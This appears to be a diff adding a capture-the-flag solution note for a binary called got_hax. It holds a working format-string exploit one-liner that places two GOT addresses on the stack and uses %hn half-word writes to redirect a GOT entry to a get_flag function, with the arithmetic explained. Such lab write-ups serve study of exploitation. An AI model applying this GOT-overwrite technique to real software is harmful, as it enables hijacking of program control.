@@ -1,0 +1,5 @@
+./got_hax `python -c 'print("\xb6\x9a\x04\x08\xb4\x9a\x04\x08" + "%2044x%6$hn%32103x%7$hn")'`
+
+format string vulnerability, overwrite the GOT entry for puts (I think, but might be printf) get the GOT entry from objdump
+look for the jmp. 2044+8 = 2052 = 0x0804, adding 32103+2052 gets the lower portion of the address to the get_flag function.
+select the address locations that you put on the stack and write half words to them
